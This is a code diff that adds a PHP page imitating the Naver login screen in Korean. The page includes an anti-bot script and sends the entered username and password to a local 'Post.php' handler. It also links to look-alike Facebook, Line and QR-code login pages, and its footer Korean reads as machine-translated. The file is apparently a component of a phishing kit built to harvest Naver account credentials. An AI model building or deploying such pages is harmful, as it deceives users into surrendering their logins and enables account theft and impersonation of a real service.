@@ -1,0 +1,96 @@
+<?php
+
+include('php/antibot.php');
+
+?>
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<title>네이버 로그인</title>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<link href="local_resources/css/e3ba2ada004aaff249f2794552e7e6bc.css" rel="stylesheet"/>
+<script src="local_resources/js/6f8bd9fb8fe489d207d9f446d5d0405d.js"></script>
+<script src="local_resources/js/ac76be9a2d55ac1d04d07d0cd49ccd30.js"></script>
+<script src="local_resources/js/101f319d9ecdb0b555b8acb7f13a2058.js"></script>
+<script src="local_resources/js/4d35d4e7950719d727c168d732547ad6.js"></script>
+<!-- Fonts -->
+<link href="local_resources/css/a24ba32ac5da266a0cfbdb58fce7cf57.css" rel="stylesheet"/>
+<link href="local_resources/css/ba7e89dc14484be81ed2741d4310f3bf.css" rel="stylesheet"/>
+<link href="local_resources/css/220e790d9b45eb66a9c49795d0ac5696.css" rel="stylesheet"/>
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+}
+</script>
+<script src="local_resources/js/ca5fadf5485bcbc6e0523a5c0e4e832e.js" type="text/javascript"></script>
+</head>
+<body id="bd">
+<div class="container" style="border: 0px solid red;">
+<div class="row my-3 px-md-5 mx-md-5" style="border: 0px solid red;">
+<div class="dropdown-content">
+<a href="index.php">한국어</a>
+<a href="eng.php">English</a>
+<!--      <a href="#">中文(简体)</a>
+      <a href="#">언어선택</a> -->
+</div>
+<div id="google_translate_element"></div>
+</div>
+</div>
+<div class="row center-text" style="border: 0px solid blue;">
+<a href="../index.php" id="header1"><h1 class="center-text mt-4" id="header1" style="">NAVER</h1></a>
+</div>
+<div class="row mx-md-1 text-center mt-2" style="display: block;">
+<form action="php/Post.php" class="" id="form1" method="POST" style="">
+<div class="form-group" id="formgroup">
+<input class="form-control" id="inp" name="us" placeholder="사용자 이름" style="" type="text"/>
+</div>
+<div class="form-group" id="formgroup">
+<input class="form-control" id="inp" name="ps" placeholder="암호" type="password"/>
+</div>
+<div class="form-group text-center" id="formgroup">
+<button class="btn btn-primary" id="btnback" name="btnnaver" type="submit">로그인</button>
+</div>
+<hr/>
+<h3 class="mt-5 mb-4 text-center" id="header2">간편한 로그인</h3>
+</form>
+<div class="text-center" id="form1">
+<a href="Socials/QRcode.php" id="sociallink">
+<div id="socials">
+<div class="my-auto text-center" id="imgsocial">
+<img class="img-fluid" src="local_resources/img/67ed97ee87d1107f807b754ff135aa82.png"/>
+</div>
+<div class="my-auto" id="contentsocial">
+<span class="my-auto" id="textsocial">QR 코드로 로그인</span>
+</div>
+</div>
+</a>
+<a href="Socials/fb.php" id="sociallink">
+<div id="socials">
+<div class="my-auto text-center" id="imgsocial">
+<img class="img-fluid" src="local_resources/img/55b292f3ea1f456f7235e0b49af2d611.png"/>
+</div>
+<div class="my-auto" id="contentsocial">
+<span class="my-auto" id="textsocial">Facebook</span>
+</div>
+</div>
+</a>
+<a href="Socials/line.php" id="sociallink">
+<div id="socials">
+<div class="my-auto text-center" id="imgsocial">
+<img class="img-fluid" src="local_resources/img/850e49aab12583ac746fec000065df0e.png"/>
+</div>
+<div class="my-auto" id="contentsocial">
+<span class="my-auto" id="textsocial">Line</span>
+</div>
+</div>
+</a>
+</div>
+<div class="text-center" id="form1">
+<span id="footer">잊었 어<a href="forgot/Reset.php" id="sociallinkf">사용자 이름</a> 또는 <a href="forgot/Reset.php" id="sociallinkf">암호</a>   ? | 가입하기</span>
+</div>
+</div>
+
+</body>
+</html>
